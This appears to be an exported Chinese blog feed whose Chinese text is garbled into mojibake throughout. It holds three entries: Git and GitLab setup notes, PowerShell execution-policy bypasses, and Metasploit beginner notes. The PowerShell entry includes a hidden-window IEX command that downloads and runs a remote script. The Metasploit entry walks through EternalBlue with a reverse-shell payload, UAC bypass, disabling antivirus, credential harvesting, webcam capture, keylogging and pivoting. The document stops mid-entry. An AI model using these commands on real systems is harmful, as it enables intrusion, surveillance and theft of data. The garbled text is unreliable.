1.åœ¨æœ¬åœ°æ–°å»º(å·²æœ‰åº“)ï¼Œç„¶åå…³è”åˆ°githubä»“åº“ echo "# new" >> README.md git init git add README.md git commit -m "first" git remote add origin https://github.com/xps/new.git # è¿æ¥è¿œç¨‹ä»“åº“ï¼ŒåŒæ­¥ç°æœ‰åº“ git pull # å…ˆæŠŠæœåŠ¡å™¨çš„ç‰ˆæœ¬åŒæ­¥åˆ°æœ¬åœ°ï¼Œç„¶åæ‰èƒ½æ­£å¸¸æäº¤ git push -u origin master # æäº¤åˆ°è¿œç¨‹githubä»“åº“ # å¦‚æœè¦ç”¨sshåè®®ï¼Œ è¦åœ¨githubçš„ä»“åº“çš„settingçš„çš„Deploy Key # ç„¶åæœ¬åœ° .ssd/id_rsa.pub å…¬é’¥ç²˜è´´ä¸Šå» # ç„¶åå°±ä¸ç”¨è¾“å…¥å¯†ç äº† ## 2.åœ¨githubæ–°å»ºï¼Œç„¶åcloneä¸‹æ¥ï¼Œå†æäº¤ GitHub pagesé€šè¿‡githubä¸Šä¼ é¡µé¢æ–‡ä»¶å»ºç«™(ç›®å‰åªæ˜¯é™æ€çš„) # æ–°å»ºåº“åä¸ºï¼š user_name.github.io # ç°åœ¨æœ¬åœ°åˆ›å»ºå·²æœ‰åº“ä¹Ÿè¡Œ(å‚ç…§åŒæ­¥åˆ°githubåº“) git clone https://github.com/user_name.github.io cd user_name.github.io/ echo "hello world" > index.html # å¯ä»¥åœ¨æœ¬åœ°è®¾ç½®å¥½é¡µé¢(é™æ€ç½‘ç«™)ï¼Œå†ä¸Šä¼  git add . git commit -m "init commit" git remote add origin https://github.com/user_name.github.io git push -u origin master # æµè§ˆå™¨è®¿é—® https://user_name.github.io SSH Keyè¿æ¥åº“Clonr or Download -> CLone with SSH Setting -> Deploy keys -> Add git clone git @github.com:xps/test.git GitLabGitLabæ˜¯å¼€æºçš„Gitåº“Webç•Œé¢ï¼ˆåŒ…å«å›¢é˜Ÿå†™åä½œå·¥å…· GitLab mattermost -&gt;å³æ—¶èŠå¤©æ²Ÿé€šçš„ï¼‰åŸºäºRubyè¯­è¨€å¼€å‘çš„Webåº”ç”¨ç¨‹åºæ‰€æœ‰ç»„ä»¶å…¨éƒ¨æ‰“åŒ…é›†æˆï¼ˆPostgresql, redis, nginx, logrotate, Sidekiq, Unicronï¼‰å¦‚æœæƒ³è¦è¦æ”¯æŒMySQLæ•°æ®åº“ï¼Œç¤¾åŒºç‰ˆéœ€è¦æ‰‹åŠ¨å®‰è£…å®‰è£…éœ€æ±‚ æœ€å°ï¼šå•æ ¸ï¼Œ1GBï¼Œé€‚å½“å­˜å‚¨ç©ºé—´(400MB)ï¼Œ100ç”¨æˆ·ä»¥ä¸‹(å»ºè®®åŒæ ¸ã€2GBä»¥ä¸Š) å®‰è£… ### é›†æˆå®‰è£…æ–¹å¼ https://packages.gitlab.com/gitlab/gitlab-ce/ # ubuntu(å®‰è£…è½¯ä»¶æº) curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash # å¼€å§‹å®‰è£…(ç­‰å¾…æ—¶é—´æ¯”è¾ƒé•¿) sudo apt install gitlab-ce # è‡ªåŠ¨åˆå§‹åŒ–é…ç½® sudo gitlab-ctl reconfigure # æŸ¥çœ‹çŠ¶æ€ sudo gitlab-ctl status # ç„¶åå°±å¯ä»¥è®¿é—®äº†ï¼Œ è®¾ç½®åˆå§‹rootå¸å·å¯†ç  # é»˜è®¤æ˜¯åªæœ‰ä¸€ä¸ªrootç®¡ç†å‘˜ # å’Œgithubç­‰çš„ä½¿ç”¨ä½“éªŒæ˜¯ç±»ä¼¼çš„ é…ç½® /etc/gitlab/gitlab.rb # é…ç½®æ–‡ä»¶ external_url # æŒ‡å®šè®¿é—®åŸŸå(ä¹Ÿå¯ä»¥å¯ç”¨https) letsencrypt ä¹Ÿé›†æˆäº† # å…è´¹https database # æŒ‡å®šå¤–éƒ¨PosgreSQLæ•°æ®åº“ email # è®¾ç½®å‡ºç«™é‚®ä»¶æœåŠ¡å™¨(æ³¨å†Œå¸å·é“¾æ¥ç­‰) sudo gitlab-ctl reconfigure # æ¯æ¬¡ä¿®æ”¹åéƒ½è¦é‡æ–°é…ç½® fitlab-ctl show-config # æ˜¾ç¤ºå·²ç»å¯ç”¨çš„é…ç½® sudo gitlab-ctl status å¸¸ç”¨å‘½ä»¤ sudo gitlab-ctl status # æŸ¥çœ‹çŠ¶æ€ sudo gitlab-ctl stop # åœæ­¢gitlab sudo gitlab-ctl start # å¯åŠ¨gitlab sudo gitlab-ctl restart # é‡å¯gitlab sudo gitlab-ctl tail # æŸ¥çœ‹æ‰€æœ‰æ—¥å¿— sudo gitlab-ctl tail nginx/gitlab_access.log # æŸ¥çœ‹nginxè®¿é—®æ—¥å¿— sudo gitlab-ctl tail postgresql # æŸ¥çœ‹postgresqlè®¿é—®æ—¥å¿— æ–°å»ºç”¨æˆ·å¸å·F1: ç®¡ç†å‘˜ç™»å½• -&gt; æ‰³æ‰‹å›¾æ ‡(å…¨å±€è®¾ç½®) -&gt; ç”¨æˆ· æ™®é€šç”¨æˆ·çš„åˆ›å»ºåº“çš„é™åˆ¶ä¸€èˆ¬è®¾ç½®ä¸º0 åˆ›å»ºå¸å·çš„æ—¶å€™ä¸èƒ½è®¾ç½®å¯†ç (æ˜¯å‘é€é‚®ä»¶ä»–è‡ªå·±è®¾ç½®)ï¼Œä½†æ˜¯åˆ›å»ºå®Œæˆä¹‹åå†æ¬¡ç‚¹å‡»ç”¨æˆ·å°±å¯ä»¥ä¿®æ”¹å¯†ç äº† F2: é»˜è®¤æ˜¯æ”¯æŒæ™®é€šç”¨æˆ·è‡ªåŠ©æ³¨å†Œçš„(ä¸å»ºè®®ï¼Œå› ä¸ºä¸€èˆ¬æ˜¯åœ¨ä¼ä¸šå†…éƒ¨ä½¿ç”¨) # é™åˆ¶/ç¦ç”¨æ™®é€šç”¨æˆ·è‡ªåŠ©æ³¨å†Œ ç®¡ç†å‘˜ç™»å½• -> æ‰³æ‰‹å›¾æ ‡(å…¨å±€è®¾ç½®) -> Setting Sign-up Restrictions(æ³¨å†Œé™åˆ¶) -> Sign-up enable ä¸é€‰ä¸­ # ç¦ç”¨è‡ªåŠ©ï¼›åªå…è®¸æ‰‹åŠ¨åˆ›å»ºå¸å· Send confirmation email on sign-up -> æŒ‡å®šé‚®ç®±åŸŸåç™½åå•(*.lab.com) Doamin Blacklist -> è®¾ç½®é»‘åå• å»ºåº“è®¾ç½®(ç§æœ‰,å†…éƒ¨,å…¬å¼€) -&gt; é€‰æ‹©åº“æˆå‘˜(è®¾ç½®â€“&gt;æˆå‘˜-&gt;è®¾ç½®ç”¨æˆ·æƒé™å’ŒæœŸé™)ï¼Œcloneï¼ŒåŒæ­¥é»˜è®¤æ˜¯httpåè®®è®¿é—®ï¼Œå¯ä»¥æ”¹ä¸ºsshå…¬é’¥è®¿é—® ä¸€å®šç¨‹åº¦ä¸Šæ”¯æŒä¸­æ–‡(settings -&gt; Perferences -&gt; Language) æ™®é€šç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•ä¹Ÿè¦é‡æ–°è®¾ç½®å¯†ç ï¼Œå°±å¯ä»¥åœ¨æœ¬åœ°cloneé¡¹ç›®åº“ï¼Œç„¶åå°±å¯ä»¥åŒæ­¥äº†(å…¶ä»–æ­¥éª¤åŒgithub) ç”¨æˆ·è®¾ç½® â€“ Profile é‚®ä»¶ï¼Œåç§°(ç»™åˆ«äººçœ‹ï¼Œæ–¹å¼ç©·ä¸¾æš´åŠ›ç ´è§£) # ç”¨æˆ·èµ„æ–™ full name ä¿®æ”¹ email ä¿®æ”¹, ä¸”ä¸å…¬å¼€ å¸å·åç§° Account -> rootä¿®æ”¹ä¸ºåˆ«çš„ # å®‰å…¨ # å¸å·(è·¯å¾„è¿™é‡Œæ‰æ˜¯) ä¿®æ”¹å¾—éšè”½ä¸€ç‚¹ SSH Key ssh-keygen # ç°åœ¨æœ¬æœºç”Ÿæˆå…¬é’¥ ~/.ssh/id_rsa.pub # ç”Ÿæˆçš„å…¬é’¥ Add Key # æ‹·è´å…¬é’¥åˆ°gitlabçš„keyçš„åœ°æ–¹ ç¦æ­¢æ™®é€šç”¨æˆ·å»ºåº“ è®¾ç½®ç”¨æˆ·å¯åˆ›å»º0ä¸ªåº“(Project) Accoumt and Limit Settings -> Default projects limit -> 0 Letâ€™s Encryptè¯ä¹¦æ›´æ–° # è‡ªåŠ¨æ›´æ–°æ—¶é—´ vim /etc/gitlab/gitlab.rb letsencrypt['auto_renew'] = true # å¼€å¯è‡ªåŠ¨æ›´æ–° letsencrypt['auto_renew_hour'] = "12" # æ¯12ä¸ªå°æ—¶ letsencrypt['auto_renew_minute'] = "30" # 30åˆ†é’Ÿ letsencrypt['auto_renew_day_of_month'] = "*/7" # æ¯éš”7å¤© document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>Git</tag>
        <tag>GitLab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PowerShellæ‰§è¡Œç­–ç•¥çš„ç®€å•ç»•è¿‡]]></title>
    <url>%2Fposts%2F15127%2F</url>
    <content type="text"><![CDATA[æ‰§è¡Œç­–ç•¥Get-ExecutionPolicy #æŸ¥çœ‹å½“å‰ç­–ç•¥ # å››ç§ - Restricted #è„šæœ¬ä¸èƒ½è¿è¡Œï¼ˆé»˜è®¤ï¼‰ - RemoteSigned #æœ¬åœ°åˆ›å»ºçš„è„šæœ¬å¯ä»¥è¿è¡Œï¼Œä½†ä»ç½‘ä¸Šä¸‹è½½çš„è„šæœ¬ä¸èƒ½è¿è¡Œ - AllSigned #ä»…å½“è„šæœ¬ç”±ä¿¡ä»»çš„å‘å¸ƒè€…ç­¾åæ—¶æ‰èƒ½è¿è¡Œ - Unrestricted #å…è®¸æ‰€æœ‰çš„è„šæœ¬è¿è¡Œ # è®¾ç½®PowerShellæ‰§è¡Œç­–ç•¥ Set-ExecutionPolicy &lt;ç­–ç•¥å> ç»•è¿‡1. # å…ˆè®¾ç½®å½“å‰ç”¨æˆ·çš„æ‰§è¡Œç­–ç•¥ä¸ºUnrestrictedï¼Œä¹Ÿç®—æ˜¯å»æ›´æ”¹äº†å½“å‰çš„å…¨å±€ç­–ç•¥ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted # å†æ‰§è¡Œè„šæœ¬ 2. # æˆ–æ˜¯ä¸‹é¢è¿™ç§ï¼Œ-Windowstyle hidden å¯ä»¥è®©æˆ‘ä»¬çš„æ‰§è¡Œæ— ä»»ä½•å¼¹çª—, -NoProfileä¸åŠ è½½å½“å‰ç”¨æˆ·é…ç½® powershell.exe -executionpolicy bypass -Windowstyle hidden -Noninteractive -nologo -NoProfile -File xxx.sp1 # Noexit æ‰§è¡Œç»“æŸä¸é€€å‡ºshell(å¯¹é”®ç›˜è®°å½•ç­‰è„šæœ¬éå¸¸æœ‰ç”¨) 3. # ç»•è¿‡æœ¬åœ°æƒé™æ‰§è¡Œ PowerShell.exe -ExecutionPolicy Bypass -File xxx.sp11 4. # ç”¨IEXä¸‹è½½è¿œç¨‹PS1è„šæœ¬ç»•è¿‡ PowerShell.exe -ExecutionPolicy Bypass -Windowstyle hidden -Noninteractive -NoProfile IEX(New-ObjectNet.WebClient).DownloadString("http://xxxxx.xxx.ps1");[Parameters] 5.æ›´å¤šæ‰§è¡Œç­–ç•¥ç»•è¿‡: https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>PowerShel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploitåˆå­¦-æ•£è®°]]></title>
    <url>%2Fposts%2F48093%2F</url>
    <content type="text"><![CDATA[MSF æœ€ç‰›Xçš„åœ°æ–¹æ˜¯ï¼šæ”¯æŒæ•´ä¸ªæ¸—é€æµ‹è¯•è¿‡ç¨‹ ç†è®ºæ–¹é¢ æŠ€æœ¯æ¶æ„1.è¾…åŠ©æ¨¡å—ï¼ˆauxiliaryï¼‰åŒ…å«äº†æ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ã€ç½‘ç»œæ¬ºéª—ç­‰ç›¸å…³åŠŸèƒ½æ¨¡å— 2.æ¸—é€æ”»å‡»æ¨¡å—(exploits)åˆ©ç”¨ç¨‹åºï¼Œé’ˆå¯¹æ¼æ´ã€æƒé™è¿›è¡Œåˆ©ç”¨ï¼Œæ˜¯ä¸»è¦ä½¿ç”¨çš„æ¨¡å— 3.æ”»å‡»è½½è·æ¨¡å—(payload)ç”¨äºåœ¨ç›®æ ‡ç³»ç»Ÿä¸­è¿è¡Œä»»æ„å‘½ä»¤æˆ–è€…æ‰§è¡Œç‰¹å®šä»£ç ï¼Œä¸»è¦ç”¨äºshellè·å– 4.ç©ºæŒ‡ä»¤æ¨¡å—(nops) 5.ç¼–ç å™¨æ¨¡å—(encoders) 6.åæ¸—é€æ”»å‡»æ¨¡å—(post) 7.å…æ€æ¨¡å—(evasion) æ¥å£MSFæœ‰å››ç§æ¥å£å¯¹å¤–æä¾›ï¼šmsfconsole, msfcli, msfgui, msfweb ä¸ºä»€ä¹ˆè¦ä½¿ç”¨Metasploitå¼€å‘ç‰ˆæ˜¯æ²¡æœ‰ç”ŸæˆæŠ¥å‘Šçš„åŠŸèƒ½çš„ï¼ˆå•†ä¸šç‰ˆæ‰æœ‰ï¼‰ï¼Œä½†æ˜¯å¼€å‘ç‰ˆçš„è„šæœ¬æ›´å¤šï¼Œæ¯ä¸ªç‰ˆæœ¬å„æœ‰åˆ©å¼Š æƒ…æŠ¥æœé›†é˜¶æ®µæœ‰æ•°æ®åº“ å¨èƒå»ºæ¨¡é˜¶æ®µ æ¼æ´åˆ†æé˜¶æ®µ åæ¸—é€æ”»å‡»æ¨¡å— æŠ¥å‘Šç”Ÿæˆæ¨¡å— ä½¿ç”¨MSFå‡†å¤‡ä½¿ç”¨å¯åŠ¨MSFmsfconsoleå¯ä»¥é…ç½®æ•°æ®åº“ç­‰ æ›´æ–°MSF apt-get update apt-get install metasploit-framework è½¯ä»¶å®‰è£…ç›®å½• /usr/share/metasploit-framework # æ•°æ®ç›®å½•(å…¶ä¸­ä¸€äº›å­—å…¸å’Œè„šæœ¬æˆ‘ä»¬ç”¨çš„æ—¶å€™å¯ä»¥æ‹¿) æ¨¡å—ä¸€ä¸ªæ¨¡å—å°±æ˜¯ä¸€ä¸ªrbè„šæœ¬ æƒ…æŠ¥æœé›† é¦–å…ˆsearch æœç´¢æœ‰å“ªäº›å¯ç”¨çš„æ¨¡å— 1.ç½‘ç«™æ•æ„Ÿç›®å½•æ‰«æï¼š /usr/share/metasploit-framework/modules/auxiliary/scanner é‡Œé¢è‡ªå·±çœ‹éƒ½æœ‰å•¥ ## ä½¿ç”¨ brute_dirs, dir_listing, dir_Scannerç­‰è¾…åŠ©æ¨¡å—æ¥è¿›è¡Œæ•æ„Ÿç›®å½•æ‰«æ # ä»–ä»¬ä¸»è¦ä½¿ç”¨æš´åŠ›çŒœè§£çš„æ–¹å¼å·¥ä½œï¼Œéœ€è¦æä¾›ç›®å½•å­—å…¸ # ä½¿ç”¨æ¨¡å— use auxiliary/scanner/http/dir_scanner # æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ info # æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•° show options # è®¾ç½®å‚æ•°ï¼ˆå–æ¶ˆè®¾ç½®å‚æ•°æ˜¯ unsetï¼‰ set RHOTS 192.168.0.101 set PATH /cms/ # æ”»å‡» exploit # è¿”å›ä¸Šä¸€çº§é€€å‡ºå½“å‰æ¨¡å— back # ä¸¤ä¸ªå¯é€‰å‘½ä»¤ setg, unsetg # ç”¨äºåœ¨msfconsoleä¸­è®¾ç½®æˆ–å–æ¶ˆè®¾ç½®å…¨å±€æ€§çš„å‚æ•°ï¼Œä»è€Œé¿å…é‡å¤è¾“å…¥ç›¸åŒçš„å€¼ ä½¿ç”¨å¸¸ç”¨çš„è¾…åŠ©æ¨¡å—è¿›è¡ŒæœåŠ¡æ‰«æ(search scanner) 2.ä¸»æœºå‘ç° ## ç”¨äºä¸»æœºå‘ç°çš„è¾…åŠ©æ¨¡å—ï¼Œä½äº modules/auxiliary/scanner/discovery use /auxiliary/scanner/discovery/arp_sweep è¿˜æ˜¯nmapé€Ÿåº¦å¿«, å¯ä»¥ç›´æ¥åœ¨msfä¸­ä½¿ç”¨nmap 3.ç«¯å£æ‰«æsearch portscan auxiliary/scanner/portscan/ack auxiliary/scanner/portscan/syn # æ¨èè¿™ä¸ª(é€Ÿåº¦å¿«ï¼Œå‡†ç¡®ï¼Œä¸æ˜“è¢«å‘ç°) auxiliary/scanner/portscan/xmas auxiliary/scanner/portscan/ftpbounce auxiliary/scanner/portscan/tcp use ...... show options set xxx 4.æ¢æµ‹æœåŠ¡è¯¦ç»†ä¿¡æ¯ 5.æœåŠ¡æŸ¥ç‚¹ç”¨æˆ·æœåŠ¡æ‰«æå’ŒæŸ¥ç‚¹çš„å·¥å…·ï¼Œé€šå¸¸ä»¥[server_name]_versionå‘½å telnetæœåŠ¡æŸ¥ç‚¹(æŸ¥å“ªäº›ä¸»æœºå¼€äº†telnetæœåŠ¡ï¼Œè€Œnampæ˜¯æŸ¥çœ‹æŸä¸»æœºå¼€æ”¾äº†å“ªäº›æœåŠ¡) SSHæœåŠ¡æŸ¥ç‚¹ use auxiliary/scanner/ssh/ssh_version # å£ä»¤çˆ†ç ´ use auxiliary/scanner/ssh/ssh_login MSSQLæœåŠ¡æŸ¥ç‚¹ use auxiliary/scanner/mssql/mssql_version æ°¸æ’ä¹‹è“å®è·µ # å…ˆæ‰«ææ˜¯å¦å­˜åœ¨ use auxiliary/scanner/smb/ms17_010_eternalblue ... # è½½åˆ©ç”¨æ”»å‡»æ¨¡å— use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/reverse_tcp set RHOST ... ... exploit æ¼æ´åˆ©ç”¨æ”¶é›†å®Œä¿¡æ¯åï¼Œé€‰æ‹©æ­£ç¡®çš„exploitï¼Œpayload è¿™é‡Œå‡è®¾æ˜¯Sambainfo exploit/multi/samba/usermap_sript, å¯ä»¥æŸ¥çœ‹åˆ°åˆ©ç”¨æˆåŠŸç‡Rankè¶Šé«˜ï¼ŒæˆåŠŸç‡è¶Šå¤§use exploit/multi/samba/usermap_sriptshow optionsset PAYLOAD cmd/unix/reverseâ€¦ â€¦ Bypass UACuse exploit/windows/local/bypassuac set session 1 run Meterpreterï¼ˆå±äºåæ¸—é€æ”»å‡»ï¼‰ Metasploitæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å— ä½œä¸ºæº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“ã€‚ä½¿ç”¨å®ƒä½œä¸ºæ”»å‡»è½½è·èƒ½å¤Ÿè·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ªMeterpreter shellçš„é“¾æ¥https://www.cnblogs.com/backlion/p/9484949.html Meterpreter shellä½œä¸ºæ¸—é€æ¨¡å—æœ‰å¾ˆå¤šæœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€éšè—ä¸€äº›ä¸œè¥¿ã€æ‰“å¼€shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ã€è¿è¡Œcmd.exeã€æ•æ‰å±å¹•ã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•è·æŒ‰é”®ä¿¡æ¯ã€æ¸…é™¤åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€æ˜¾ç¤ºè¿œç¨‹æœºå™¨çš„ç½‘ç»œæ¥å£å’ŒIPåœ°å€ç­‰ä¿¡æ¯ã€‚å¦å¤–Meterpreterèƒ½å¤Ÿèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚åœ¨è¿œç¨‹ä¸»æœºä¸Šéšè—è‡ªå·±,å®ƒä¸æ”¹å˜ç³»ç»Ÿç¡¬ç›˜ä¸­çš„æ–‡ä»¶,å› æ­¤HIDS[åŸºäºä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ]å¾ˆéš¾å¯¹å®ƒåšå‡ºå“åº”ã€‚æ­¤å¤–å®ƒåœ¨è¿è¡Œçš„æ—¶å€™ç³»ç»Ÿæ—¶é—´æ˜¯å˜åŒ–çš„,æ‰€ä»¥è·Ÿè¸ªå®ƒæˆ–è€…ç»ˆæ­¢å®ƒå¯¹äºä¸€ä¸ªæœ‰ç»éªŒçš„äººä¹Ÿä¼šå˜å¾—éå¸¸å›°éš¾ã€‚ # ä¼˜åŠ¿ - çº¯å†…å­˜å·¥ä½œæ¨¡å¼ï¼Œä¸éœ€è¦å¯¹å†…å­˜è¿›è¡Œå†™å…¥æ“ä½œ - ä½¿ç”¨åŠ å¯†é€šä¿¡åè®®ï¼Œä¸”å¯ä»¥åŒæ—¶ä¸å‡ ä¸ªä¿¡é“é€šä¿¡ - åœ¨è¢«æ”»å‡»è¿›ç¨‹å†…å·¥ä½œï¼Œä¸éœ€è¦åˆ›å»ºæ–°çš„è¿›ç¨‹ - æ˜“äºåœ¨å¤šè¿›ç¨‹ä¹‹é—´è¿ç§» - å¹³å°é€šç”¨ è¿›ç¨‹è¿ç§»åˆšè·å–Meterpreter shellçš„æ—¶å€™ï¼Œæ˜¯è„†å¼±çš„(ç”¨æˆ·éšæ—¶å¯èƒ½å…³é—­)ï¼Œæ‰€ä»¥ç¬¬ä¸€æ—¶é—´æ˜¯ç§»åŠ¨shellï¼ŒæŠŠå®ƒå’Œä¸€ä¸ªç¨³å®šçš„è¿›ç¨‹ç»‘å®šåœ¨ä¸€èµ·ï¼Œè€Œä¸éœ€è¦å¯¹ç£ç›˜è¿›è¡Œä»»ä½•å†™å…¥æ“ä½œ(æ›´ä¸æ˜“è¢«å‘ç°) ps # è·å–ç›®æ ‡æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ getpid # æŸ¥çœ‹Meterpreter shellçš„è¿›ç¨‹å· mirate 448 # æŠŠshellç§»åŠ¨åˆ°PIDä¸º448çš„è¿›ç¨‹é‡Œ(å› ä¸ºè¿™é‡Œè¿™ä¸ªç¨³å®šï¼Œçœ‹æƒ…å†µæ¥å§) getpid # å‘ç°shellçš„è¿›ç¨‹è¿ç§»OK(åŸæ¥çš„è¿›ç¨‹ä¼šè‡ªåŠ¨å…³é—­ï¼Œå¦‚æœæ²¡å…³é—­å°±æ‰‹åŠ¨å…³æ‰ï¼škill xxx_pid) # è‡ªåŠ¨è¿ç§»è¿›ç¨‹æŒ‡ä»¤(ç³»ç»Ÿä¼šè‡ªåŠ¨å¯»æ‰¾åˆé€‚çš„è¿›ç¨‹ç„¶åè¿ç§») run post/windows/manage/migrate å¸¸ç”¨å‘½ä»¤ ########## ç³»ç»Ÿå‘½ä»¤ï¼ˆæ”¶é›†ç³»ç»Ÿä¿¡æ¯ï¼‰ systeminfo # æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ run post/windows/gather/checkv # æ£€æŸ¥æ˜¯å¦ä¸ºè™šæ‹Ÿæœº idletime # ç›®æ ‡æœºå™¨æœ€è¿‘è¿è¡Œæ—¶é—´ ifconfig/ipconfig # æŸ¥çœ‹ç½‘å¡ä¿¡æ¯ route # æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ï¼Œè®¾ç½®è·¯ç”±ï¼ˆåšè·³æ¿ç”¨ï¼‰ background # æŠŠä¼šè¯æ”¾åˆ°åå°ï¼Œè¿™ä¸ªä¼šè¯ç»§ç»­ä¿æŒ sessions # æŸ¥çœ‹ä¼šè¯åˆ—è¡¨ sessions -i 2 # è¿›å…¥åˆ‡å›ä¼šè¯2 getuid # è·å–å½“å‰ç”¨æˆ·idæƒé™ run post/windows/manage/killav # å…³é—­æ€æ¯’(å…¶ä»–å‘½ä»¤è‡ªå·±æ¢ç´¢) run post/windows/manage/enable_rdp # å¼€å¯ç›®æ ‡æœºå™¨çš„è¿œç¨‹æ¡Œé¢ run post/windows/manage/autoroute # æŸ¥çœ‹ç›®æ ‡æœºçš„æœ¬åœ°å­ç½‘æƒ…å†µ # æ¥ç€è¿›è¡Œè·³è½¬ background # æŠŠå½“å‰ç»ˆç«¯éšè—åœ¨åå° route add 192.168.0.111 255.255.255.0 1 # ç»™æŒ‡å®šä¼šè¯idæ·»åŠ è·¯ç”±(å¯ä»¥æ·»åŠ å…¶ä»–åœ°å€åˆ°è¢«æ”»é™·çš„æœºå™¨çš„è·¯ç”±è¡¨ä¸Šï¼Œå€ŸåŠ©è¢«æ”»é™·çš„æœºå™¨æ¥æ”»å‡»å…¶ä»–ç½‘ç»œ) route print # æŸ¥çœ‹è·¯ç”±æ·»åŠ ç»“æœ # æ¥ç€æŸ¥çœ‹ run post/windows/gather/enum_logged_on_users # åˆ—ä¸¾å½“å‰æœ‰å¤šå°‘ç”¨æˆ·ç™»å½•äº†ä¸»æœº run post/windows/gather/enum_logged_on_users # ç»§ç»­åˆ—ä¸¾å®‰è£…åœ¨ç›®æ ‡æœºå™¨ä¸Šçš„åº”ç”¨ run post/windows/gather/credentials/windows_autologin # å¾ˆå¤šç”¨æˆ·ä¹ æƒ¯å°†è®¡ç®—æœºè®¾ç½®è‡ªåŠ¨ç™»å½•(æŠ“å–è‡ªåŠ¨ç™»å½•çš„å¯†ç )ï¼Œå¦‚æœçœ‹ä¸åˆ°ä»»ä½•ä¿¡æ¯ï¼Œå°±éœ€è¦æ‹“å±•æ’ä»¶Expia load espia # å…ˆåŠ è½½è¯¥æ’ä»¶ screengrab # å°±å¯ä»¥æŠ“å–æ­¤æ—¶ç›®æ ‡æœºå™¨çš„å±å¹•æˆªå›¾ screenshot # ä¹Ÿæ˜¯æˆªå± webcam snap # æ‰“å¼€ç›®æ ‡æœºå™¨æ‘„åƒå¤´ï¼Œæ‹æ‘„ä¸€å¼ ç…§ç‰‡ webcam_stream # å¼€å§‹æ‘„åƒå¤´(ç›´æ’­æ¨¡å¼)ï¼Œåœ¨æµè§ˆå™¨è¾“å…¥ç»™å‡ºçš„urlå‘é‚£ä¸ªé—®å³å¯ shutdown # å…³æœº shell # è¿›å…¥ç›®æ ‡ç³»ç»Ÿçš„shellä¸‹é¢ exit # åœæ­¢meterpreterä¼šè¯ï¼ˆä¹Ÿå¯ä»¥åœæ­¢shellå¹¶è¿”å›åˆ°meterpreterï¼‰ quit # å…³é—­å½“å‰çš„Meterpreterä¼šè¯ï¼Œè¿”å›MSFç»ˆç«¯ ########## æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤ pwd / getwd # æŸ¥çœ‹ç›®æ ‡æœºå™¨å½“å‰ç›®å½• getlwd # æŸ¥çœ‹æœ¬æœºå½“å‰ç›®å½• cd # åˆ‡æ¢ç›®å½•(æ³¨æ„\çš„è½¬ä¹‰) ls # æŸ¥çœ‹å½“å‰ç›®å½•å†…å®¹ search -f *.txt -d c: # æœç´¢æ–‡ä»¶ï¼ˆsearch -h æŸ¥çœ‹å¸®åŠ©ï¼‰ -dæŒ‡å®šç›®å½•ï¼Œ -fæœç´¢æ¨¡å¼ upload /var/www/test.txt c:\ # ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœºå™¨çš„è·¯å¾„ download c:\test.txt # ä¸‹è½½æ–‡ä»¶(é»˜è®¤ä¿å­˜åˆ°msfçš„ç›®å½•) cat # æŸ¥çœ‹æ–‡ä»¶å†…å®¹ edit # ç¼–è¾‘æ–‡ä»¶ execute -f c:\\windows\\system32\\calc.exe # æ‰§è¡Œæ–‡ä»¶ run keylogrecorder .... # é”®ç›˜è®°å½•ï¼Ÿ åæ¸—é€æ”»å‡»ï¼šææƒ çºµå‘ææƒ æ¨ªå‘ææƒ # è·å–Meterpreter Shellä¹‹åï¼ŒæŸ¥çœ‹æˆ‘ä»¬æ˜¯ä»€ä¹ˆæƒé™ # Meterpreter ä¸‹è¾“å…¥ shell # è¿›å…¥ç›®æ ‡çš„cmd whoami /groups # æŸ¥çœ‹å½“å‰æƒé™ ## ä¸‹é¢å°±å¼€å§‹è¿›è¡Œææƒäº† # ç”¨æœ¬åœ°æº¢å‡ºæ¼æ´ï¼Œåˆ©ç”¨ç°æˆçš„exploit 